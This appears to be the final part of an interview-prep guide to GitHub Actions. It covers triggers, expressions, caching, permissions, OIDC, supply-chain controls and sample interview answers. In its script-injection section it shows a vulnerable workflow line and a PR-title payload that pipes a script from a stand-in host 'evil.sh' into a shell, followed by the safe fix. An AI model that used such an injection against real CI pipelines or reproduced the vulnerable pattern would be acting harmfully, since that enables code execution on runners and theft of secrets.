Part three of three, and the one to read if you only read one. A cumulative review of **the entire series** — foundations, pipeline machinery, and the security and platform work a senior owns — organised by topic rather than by level. About fifty minutes. Fast review first, common questions at the end.

## Part one — foundations

<div class="flow">
  <div class="node">EVENT<small>push / PR / cron</small></div>
  <span class="arrow">&rarr;</span>
  <div class="node">WORKFLOW<small>one YAML file</small></div>
  <span class="arrow">&rarr;</span>
  <div class="node">JOB<small>one fresh machine</small></div>
  <span class="arrow">&rarr;</span>
  <div class="node">STEP<small>run or uses</small></div>
</div>

> GitHub Actions is GitHub's built-in CI/CD platform. A YAML file in `.github/workflows/` declares triggers and jobs; GitHub runs each job on a machine it creates and destroys. The pipeline lives in the repository, so it is versioned and reviewed like code.

**One workflow, many jobs, each job many steps, each job its own machine.** Mandatory keys: `on`, `jobs`, and per job `runs-on` and `steps`.

```yaml .github/workflows/ci.yml
name: CI
on:
  push:
    branches: [main]
  pull_request:
jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - uses: actions/setup-python@v5
        with: { python-version: '3.11', cache: pip }
      - run: pip install -r requirements.txt
      - run: pytest -q
```

<div class="guide-compare">
  <div class="guide-compare-col good">
    <h4>Steps</h4>
    <ul>
      <li>One machine, one filesystem, written order</li>
      <li>Failure stops the rest of the job</li>
      <li>Share via files, <code>$GITHUB_ENV</code>, step outputs</li>
    </ul>
  </div>
  <div class="guide-compare-col bad">
    <h4>Jobs</h4>
    <ul>
      <li>Own machine each, parallel unless <code>needs</code></li>
      <li>No shared filesystem at all</li>
      <li>Share files via artifacts, strings via job outputs</li>
    </ul>
  </div>
</div>

`run` is a shell command; `uses` is a published action configured with `with:` — mutually exclusive in one step. `needs` builds the dependency graph and grants access to the earlier job's outputs.

### Triggers

| Trigger | Fires when |
|---|---|
| `push` / `pull_request` | Commits land / a PR opens, updates, reopens |
| `workflow_dispatch` | A human clicks **Run workflow**; supports typed `inputs` |
| `schedule` | Cron matches — **UTC**, default branch only, queued not punctual |
| `release`, `issues`, `issue_comment` | Release published, issue activity |
| `workflow_run` | Another workflow finished — base-repo context |
| `repository_dispatch` | External API call, payload in `client_payload` |

```yaml
on:
  push:
    branches: [main]
    tags: ['v*']
    paths-ignore: ['docs/**', '**/*.md']
  pull_request:
    types: [opened, synchronize, reopened]
  workflow_dispatch:
    inputs:
      environment: { type: choice, options: [staging, production] }
```

### The traps, and their single cause

The runner is new per job; the shell is new per step.

| Symptom | Cause | Fix |
|---|---|---|
| "No such file" for a repo file | Runner starts empty | `actions/checkout@v4` |
| Deploy cannot find `dist/` | Different machine | Artifact upload + download |
| `cd` has no effect next step | New shell per step | `working-directory:` |
| `export` empty next step | Shell dies with the step | `>> "$GITHUB_ENV"` |
| `if` never matches on main | `github.ref` is `refs/heads/main` | Compare the full ref |
| `python-version: 3.10` → 3.1 | YAML numeric | Quote versions |

## Part two — pipeline machinery

### Expressions and contexts

| Context | Holds |
|---|---|
| `github` | `ref`, `ref_name`, `sha`, `actor`, `event_name`, `repository`, `run_id`, `run_number`, `event.*` |
| `runner` | `os`, `arch`, `temp`, `tool_cache` |
| `env` / `vars` / `secrets` | Variables and configuration |
| `needs` | `needs.<job>.outputs.*`, `needs.<job>.result` |
| `steps` | `steps.<id>.outputs.*`, `.outcome`, `.conclusion` |
| `matrix` / `strategy` / `inputs` / `job` | Combination, `job-index`, declared inputs, `job.status` |

Functions: `contains`, `startsWith`, `endsWith`, `format`, `join`, `toJSON`, `fromJSON`, `hashFiles`. Status: `success()`, `failure()`, `cancelled()`, `always()`.

```yaml
if: startsWith(github.ref, 'refs/tags/v') && github.actor != 'dependabot[bot]'
if: contains(fromJSON('["main","develop"]'), github.ref_name)
```

Inside `if:` the `${{ }}` wrapper is **optional**; `&&`/`||` return **operands not booleans**, which is why `${{ inputs.tag || github.sha }}` is the default-value idiom.

**`outcome` vs `conclusion`:** raw step result vs result after `continue-on-error`. A tolerated failure is `failure` / `success`. **`always()` runs even on cancellation** — use `!cancelled()` for cleanup that should stop.

### The four special files

```yaml
- id: meta
  run: |
    echo "TAG=sha-${GITHUB_SHA::7}" >> "$GITHUB_ENV"          # later steps
    echo "tag=sha-${GITHUB_SHA::7}" >> "$GITHUB_OUTPUT"        # step output
    echo "$HOME/.local/bin"         >> "$GITHUB_PATH"          # PATH
    echo "| coverage | 91% |"       >> "$GITHUB_STEP_SUMMARY"  # run page
```

Not readable in the writing step; **none cross a job boundary**. Across jobs: **outputs for strings, artifacts for files** — job outputs are size-limited and not secret.

### Secrets versus variables

| | Secrets `${{ secrets.X }}` | Variables `${{ vars.X }}` |
|---|---|---|
| Storage | Encrypted, write-only in UI | Plain text, readable |
| In logs | Masked, best effort | Printed normally |
| Fork pull requests | **Not** provided | Provided |
| For | Tokens, keys, passwords | Regions, URLs, flags |

Three levels — organisation → repository → environment — most specific wins. `GITHUB_TOKEN` is automatic, per job, repository-scoped, expires with the job. **Pass secrets via `env`, never into a command line**, and never echo them: masking cannot redact a value you transformed.

### Caching and artifacts

```yaml
- uses: actions/cache@v4
  with:
    path: ~/.cache/pip
    key: ${{ runner.os }}-pip-${{ hashFiles('**/requirements*.txt') }}
    restore-keys: ${{ runner.os }}-pip-
```

`key` is exact and a hit **skips the save**; `restore-keys` are prefixes; entries are **immutable**; scope follows the branch graph; `cache-hit` is `'true'` only on exact match. A volatile key never hits; a fixed key never invalidates. Cache **downloads**, never installed trees.

```yaml
- uses: actions/upload-artifact@v4
  if: always()
  with:
    name: coverage-${{ matrix.python }}   # v4 conflicts on duplicate names
    path: reports/
    retention-days: 7
    if-no-files-found: error
```

*A cache is an optimisation you must be able to lose; an artifact is data you cannot.*

### Job graph, matrix, services

```yaml
jobs:
  setup:
    outputs: { targets: '${{ steps.v.outputs.targets }}' }
  build:
    needs: setup
    strategy:
      matrix:
        target: ${{ fromJSON(needs.setup.outputs.targets) }}
  report:
    needs: [setup, build]
    if: always()
    steps: [{ run: 'echo ${{ needs.build.result }}' }]
```

Matrix axes multiply, `exclude` removes, `include` adds; `fail-fast: true` by default; `max-parallel` for shared resources; 256-job ceiling; **adding an axis renames a required check**.

Service containers need a **health check** — its absence is the entire explanation for "fails on the first run, passes on the re-run". Hostname is `localhost` from the runner, the **service name** from inside a `container:`.

### Reuse, environments, concurrency

<div class="guide-compare">
  <div class="guide-compare-col good">
    <h4>Reusable workflow — job level</h4>
    <ul>
      <li><code>on: workflow_call</code>, typed inputs, explicit secrets, outputs</li>
      <li>Own jobs, runners, <code>permissions</code></li>
      <li>Receives the caller's token; cannot exceed it</li>
    </ul>
  </div>
  <div class="guide-compare-col bad">
    <h4>Composite action — step level</h4>
    <ul>
      <li>Runs in the caller's job on the caller's runner</li>
      <li>No jobs, no matrices, no own runner</li>
      <li><code>shell:</code> mandatory on every <code>run</code></li>
    </ul>
  </div>
</div>

```yaml
# CI: one run per branch, cancel superseded
concurrency: { group: '${{ github.workflow }}-${{ github.ref }}', cancel-in-progress: true }
# CD: one deploy at a time, QUEUE rather than cancel
concurrency: { group: deploy-production, cancel-in-progress: false }
```

An **environment** gives scoped secrets and variables, required reviewers, wait timers, branch restrictions, and deployment history. A **required check skipped by a path filter** blocks a PR forever — fix with a same-named stub workflow.

## Part three — trust, security, and scale

### The trust model

Three properties decide exposure: **whose code runs**, **whether secrets are present**, **what the token can do**.

| Trigger | Executes code from | Secrets | Token |
|---|---|---|---|
| `push`, same-repo `pull_request` | Your repository | Yes | As configured |
| `pull_request` from a **fork** | The fork | **No** | Read-only |
| `pull_request_target` | The base repository | **Yes** | Write-capable |
| `workflow_run`, `issue_comment` | The base repository | Yes | Write-capable |

<div class="callout warn">
  <span class="ct">The answer that must be instant</span>
  <code>pull_request_target</code> plus checking out <code>github.event.pull_request.head.sha</code> executes <b>untrusted fork code</b> in a job holding <b>your secrets and a writable token</b>. Safe shapes: never check out the head ref, or split privilege — an unprivileged <code>pull_request</code> job builds and uploads an artifact, and a separate <code>workflow_run</code> job consumes it without executing fork code.
</div>

### Script injection

```yaml
# Vulnerable — a PR titled  "; curl evil.sh | sh ;  runs on your runner
- run: echo "Title: ${{ github.event.pull_request.title }}"

# Safe — the value arrives as data, never as shell source
- env:
    TITLE: ${{ github.event.pull_request.title }}
  run: echo "Title: $TITLE"

# Same rule for github-script, where it is spliced into JavaScript
- uses: actions/github-script@v7
  env:
    TITLE: ${{ github.event.issue.title }}
  with:
    script: console.log(process.env.TITLE)
```

**`${{ github.event.* }}` never appears inside a `run` body.**

### Permissions and identity

```yaml
permissions:
  contents: read            # read-only floor for the workflow
jobs:
  release:
    permissions:
      contents: write       # widened for one job only
      packages: write
      id-token: write       # required for OIDC
```

**Declaring any scope sets every undeclared scope to `none`** — the whole mechanism. Set the organisation default to read-only and make workflows opt in. A reusable workflow **receives the caller's token** and cannot exceed it. `GITHUB_TOKEN` **cannot reach another repository** — use a GitHub App installation token (scoped, short-lived, attributable) rather than a PAT (a human's full access, no job-bound expiry).

### OIDC

<div class="guide-timeline">
  <div class="guide-timeline-item"><span>1</span><strong>Job requests a token</strong><small>GitHub signs a short-lived JWT describing repository, ref, environment, workflow.</small></div>
  <div class="guide-timeline-item"><span>2</span><strong>Cloud verifies the signature</strong><small>GitHub's OIDC provider is a registered trusted identity provider.</small></div>
  <div class="guide-timeline-item"><span>3</span><strong>Trust policy checks the claims</strong><small>The part that matters, and the part usually misconfigured.</small></div>
  <div class="guide-timeline-item"><span>4</span><strong>Temporary credentials issued</strong><small>Valid for the job. Nothing stored, nothing to rotate or leak.</small></div>
</div>

<div class="callout warn">
  <span class="ct">Where OIDC is almost always wrong</span>
  A trust policy matching <code>repo:my-org/*:*</code> lets <b>any branch of any repository</b> assume the role — including a branch an attacker opens a PR from. Constrain the <code>sub</code> claim to <code>repo:org/repo:ref:refs/heads/main</code>, or better <code>…:environment:production</code>. Then verify from a throwaway branch — it must be refused.
</div>

### Supply chain

| Control | Removes |
|---|---|
| SHA-pin third-party actions | A moving tag repointed at malicious code |
| Dependabot on `github-actions` | Pins going stale — pinning without updating is its own failure |
| Organisation allow-list | Unvetted actions entering via any repository |
| `contents: read` default | A compromised step's ability to push |
| Environment protection | An automated path to production without review |
| Attestations / provenance | Being unable to prove what built an artifact |

Two surfaces worth raising unprompted: **caches are a write surface** — a PR branch can poison a cache a later `main` run restores; and **self-hosted runners on public repositories** combine untrusted code with persistent state.

### Container builds, custom actions, runners, cost

```yaml
- uses: docker/setup-buildx-action@v3
- uses: docker/build-push-action@v6
  with:
    push: ${{ github.event_name != 'pull_request' }}   # forks must not publish
    tags: ghcr.io/${{ github.repository }}:sha-${{ github.sha }}
    cache-from: type=gha
    cache-to: type=gha,mode=max                        # intermediate layers too
    provenance: true
```

| Action type | Runs as | For | Watch out |
|---|---|---|---|
| Composite | Steps in the caller's job | Repeated step sequences | `shell:` on every `run` |
| JavaScript | Node on the runner | Logic, API calls, cross-platform | Bundled `dist/` must be committed |
| Docker | A container on the runner | Any toolchain | Linux only, pull cost per job |

Hosted runners by default; larger hosted before self-hosted; self-hosted only for GPU, licences, or VPC reach — and then **ephemeral, repo-scoped, network-segmented, never fork-schedulable**. Windows bills ~2× Linux, macOS ~10×.

### Platform, observability, ML

Standardise with reusable workflows in an organisation `.github` repository, CODEOWNERS on the workflow folder, a moving major tag, and a **canary repository before moving it**. Enforce with policy, not documentation — and keep upstream turnaround fast, because if a reasonable change takes two weeks, forking is rational and you will lose.

Four numbers turn "CI is slow" into a funded priority: **median and p95 duration · failure rate split into real failures and flakes · queue time · cost by workflow and runner label.**

For ML: **Actions is the orchestrator and audit trail, not the compute.** Validate cheaply, submit to a training platform, gate on a **comparison against the deployed model** rather than a fixed threshold, publish metrics to the step summary, promote from a separate job behind an environment.

### The review checklist

| Check | Looking for |
|---|---|
| `on:` triggers | `pull_request_target`, `workflow_run`, `issue_comment` |
| Checkout ref | `head.sha` under `pull_request_target` |
| `permissions` | Present, minimal, widened per job |
| Third-party `uses:` | SHA-pinned, recognisable, Dependabot-covered |
| Interpolation | No `${{ github.event.* }}` in a `run` or `github-script` |
| Secrets | Never echoed, never in a job running untrusted code |
| `concurrency` / `timeout-minutes` | Present; cancelling on CI, queuing on deploys |
| Cache | Hashes a lockfile; nothing executable restored then run |
| Required checks | Job names unchanged, or branch protection updated together |

## Common interview questions

<ol class="guide-steps">
  <li><b>Explain <code>pull_request</code> versus <code>pull_request_target</code>, and the pattern that makes the second dangerous.</b>Fork PRs under <code>pull_request</code> get no secrets and a read-only token — deliberately harmless. <code>pull_request_target</code> runs in the base repository's context with secrets and a writable token; combined with checking out <code>head.sha</code> it executes untrusted fork code with full credentials. Never check out the head ref there; split across <code>pull_request</code> and <code>workflow_run</code> if you need both.</li>
  <li><b>Write a <code>permissions</code> block for a workflow that publishes a package and deploys with OIDC.</b><code>contents: read</code> at workflow level as a floor; on the publish job <code>packages: write</code> plus <code>contents: write</code> only if it tags; on the deploy job <code>id-token: write</code> and <code>contents: read</code>. Declaring any scope zeroes the rest, which is the point.</li>
  <li><b>Describe a safe OIDC trust policy and one that looks fine but is not.</b>Safe: <code>sub</code> constrained to <code>repo:org/repo:environment:production</code>, making the approval part of the identity. Unsafe: <code>repo:org/*:*</code>, satisfiable by any branch of any repository including a fork PR branch. Verify by attempting assume-role from a throwaway branch.</li>
  <li><b>A secret appeared in a public build log an hour ago.</b>Rotate first — assume it is already scraped. Then revoke, delete the log and run, find the line that printed it, and close the class: secrets through <code>env</code> and never interpolated, plus OIDC so there is nothing to leak.</li>
  <li><b>Give three supply-chain controls ordered by risk removed.</b>SHA-pin third-party actions; default the token to <code>contents: read</code>; organisation allow-list plus Dependabot so pins do not go stale.</li>
  <li><b>CI takes 25 minutes and people have stopped waiting.</b>Measure first. Then in order of leverage: do less work (concurrency cancellation, path filters, conditions), reuse work (caching, prebuilt images), parallelise (matrix sharded by duration). Move slow suites to a schedule with a smoke subset on the PR. A bigger runner first is the answer of someone who has not measured.</li>
  <li><b>Every deploy since Tuesday shipped the wrong build.</b>Cache and artifact names before the code — a never-invalidating key, or two matrix cells uploading the same artifact name, both produce this and neither appears in a diff. Then deploy by immutable SHA tag or digest.</li>
  <li><b>CI is 30% flaky and people re-run until green.</b>Re-running destroys the signal. Measure which jobs fail and how, then remove causes in order: missing service health checks, matrix cells sharing a fixture, unpinned external dependencies, timing assumptions. Quarantine what you cannot fix into a named non-blocking job.</li>
  <li><b>A third-party action you depend on was compromised.</b>Find every repository referencing it and at what ref, revoke every secret those workflows could reach, replace with a vetted SHA or internal fork, then close the class with pinning, an allow-list, and Dependabot.</li>
  <li><b>How do you standardise CI across sixty repositories?</b>Reusable workflows in an organisation <code>.github</code> repository with CODEOWNERS; consumers pin a major tag you move on release; canary one repository first; inputs as a public API; enforced by branch protection and an allow-list. Keep upstream turnaround fast or teams fork.</li>
  <li><b>Choose between composite, JavaScript, and Docker actions.</b>Composite for a repeated step sequence, but it cannot define jobs, matrices, or its own runner. JavaScript for real logic and identical cross-platform behaviour, at the cost of a committed <code>dist/</code>. Docker for an arbitrary toolchain, at the cost of Linux-only and a pull per job.</li>
  <li><b>What changes when the pipeline trains a model?</b>Lint, tests, caching, environments, and OIDC carry over. New: data validation as a gate, metric thresholds that fail the job, comparison against the deployed model, and lineage linking commit and dataset version to the artifact. Actions orchestrates and records; it does not train.</li>
  <li><b>How would you migrate from Jenkins?</b>Inventory jobs; port leaf jobs first to prove runners, network, and credentials; run both systems in parallel with Actions non-blocking; move required checks one at a time; decommission deliberately. Do not port Jenkinsfile logic verbatim — much of it works around a persistent workspace Actions does not have.</li>
  <li><b>GitHub App token or PAT?</b>The App: scoped to chosen repositories, short-lived, attributable to automation. A PAT carries a human's full access, outlives the job, and appears as that person — breaking least privilege and accountability.</li>
  <li><b>Where does a cache become a security problem?</b>When a lower-privilege context can write one a trusted run restores. Anything executable restored from cache is code you did not review. Cache dependency downloads, verify what you execute, never cache build outputs you then run.</li>
  <li><b>How do you keep a production credential away from ordinary CI?</b>Put it on a protected <b>environment</b>, not the repository — only a job declaring that environment and passing its gate can read it. Better still, remove it: OIDC plus a role whose trust policy names that environment.</li>
  <li><b>How would you argue for investment in CI?</b>With the four numbers pulled from the REST API and trended. "CI is slow" is an opinion; "p95 on our main pipeline is 27 minutes and 18% of runs are re-runs" is a priority.</li>
  <li><b>Everything went red at once. First three moves?</b>Establish blast radius — simultaneous failure everywhere points at a shared workflow release, an action release, or a runner image change. Compare against the last green run for environmental differences. Re-run one failed job with debug logging rather than the whole pipeline.</li>
</ol>

## Final self-test

- Give the trust table from memory: which triggers grant secrets and a writable token.
- Name the exact `pull_request_target` exfiltration pattern and two safe alternatives.
- Explain why declaring one `permissions` scope is a security control.
- Describe a safe OIDC `sub` constraint and how you would verify it.
- Give both ways a cache key can be wrong, and where a cache becomes a security problem.
- Write a concurrency block for CI and one for CD, and justify the difference.
- Name the four special files and what each does.
- Explain `outcome` versus `conclusion`, and when `always()` is the wrong choice.
- Choose between composite, JavaScript, and Docker actions with reasons.
- Name the four numbers you would track to argue CI needs investment.
- Recite the review checklist you would apply to a workflow pull request.
